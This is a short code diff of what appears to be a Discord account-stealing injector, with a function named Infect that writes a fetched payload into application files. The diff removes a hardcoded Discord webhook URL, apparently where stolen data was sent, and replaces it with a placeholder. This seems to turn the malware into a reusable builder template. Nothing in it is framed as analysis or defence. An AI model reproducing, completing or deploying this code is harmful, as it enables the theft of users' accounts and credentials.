@@ -4,7 +4,6 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discordapp.com/api/webhooks/965658435339313172/RNnW5sgBSXAuB_QU1cufW41f9hz4dnwrvLtNumiM1XGCTyNItlTAK2jNxXM43UyJRfmm"
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -48,7 +47,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", "%WEBHOUK%1").replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("0000000",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
